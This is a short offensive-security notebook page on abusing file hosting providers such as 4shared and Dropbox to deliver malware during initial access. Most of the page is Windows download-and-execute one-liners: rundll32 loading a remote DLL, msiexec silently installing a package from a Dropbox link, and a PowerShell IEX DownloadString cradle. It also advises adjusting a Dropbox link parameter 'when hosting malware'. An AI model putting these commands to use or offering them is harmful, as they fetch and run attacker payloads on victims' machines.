# File Hosting Providers

## 4shared

TODO: Fill in this info

```
C:\> rundll32.exe \\<4shared_link>\payload.dll,Main
```

## Dropbox

Change the parameter `dl=1` to `dl=0` when hosting malware.

### Command Prompt

```
C:\> msiexec.exe /quiet /i /qn https://dropbox.com/s/<code>/?dl=1
```

### PowerShell

```powershell
PS C:\> IEX (new-object Net.WebClient).DownloadString('https://dropbox.com/s/<code>/?dl=1'))
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/PE Execution/DLL/Manual]]

- [Bumblebee Loader Resurfaces in New Campaign](https://intel471.com/blog/bumblebee-loader-resurfaces-in-new-campaign)

- [LOLAPPS: Dropbox](https://lolapps-project.github.io/lolapps/Web/dropbox/)

- [How to force a shared link to download or render](https://help.dropbox.com/share/force-download)